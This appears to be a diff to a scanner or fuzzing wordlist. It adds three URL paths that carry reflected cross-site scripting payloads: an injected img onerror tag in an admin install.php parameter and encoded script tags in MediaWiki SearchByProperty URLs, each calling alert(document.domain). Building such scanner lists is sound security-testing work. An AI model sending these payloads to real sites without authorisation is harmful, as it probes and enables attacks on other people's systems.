@@ -711,3 +711,6 @@
 /typo3conf/ext/caddy/Resources/Public/JavaScript/e-payment/paymill/api/payment.php
 /caddy/Resources/Public/JavaScript/e-payment/paymill/api/php/payment.php
 /typo3plugins/plugins/caddy/Resources/Public/JavaScript/e-payment/paymill/api/php/payment.php
+/admin/install.php?install=2&db_type=mysqli&hostname=&db_username={{randstr}}&timezone=UTC&db_table_prefix=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
+/index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
+/w/index.php?title=Special:SearchByProperty&property=%253Escript%253Calert(document.domain)%253E/script%253C
